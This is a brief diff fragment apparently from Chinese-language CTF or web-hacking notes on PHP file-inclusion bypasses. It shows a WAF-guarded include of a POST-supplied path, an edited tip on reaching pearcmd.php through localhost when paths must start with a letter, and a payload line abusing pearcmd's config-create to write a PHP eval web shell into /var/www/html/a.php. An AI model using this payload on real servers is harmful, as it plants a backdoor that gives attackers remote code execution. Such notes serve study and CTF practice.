@@ -142,7 +142,7 @@ if(waf($_POST[1])){
     include "file://".$_POST[1];
 }
 ```
-如果知道pearcmd.php路径，又不让用../，用localhost+根路径
+如果知道pearcmd.php路径，要求字母开头不能直接/usr/，用localhost+根路径
 ```
 GIT写木马
 /?+config-create+/<?=eval($_POST[2]);?>+/var/www/html/a.php 
